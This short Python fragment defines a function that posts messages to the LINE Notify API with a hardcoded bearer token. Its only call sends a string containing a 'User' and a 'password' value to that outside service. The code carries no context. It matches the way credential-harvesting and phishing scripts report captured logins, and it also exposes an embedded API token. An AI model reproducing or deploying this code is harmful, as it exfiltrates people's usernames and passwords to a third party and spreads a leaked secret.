def lineNotify(message):
        payload = {'message':message}
        return _lineNotify(payload)
def _lineNotify(payload,file=None):
        url = 'https://notify-api.line.me/api/notify'
        token = 'JhRpYaNo51RAG8Ghru4bbHTsHgHusBV3XRn79ZJQvGO'
        headers = {'Authorization':'Bearer '+token}
        return requests.post(url, headers=headers , data = payload, files=file)

lineNotify(f'User = {User} password = {password} ')
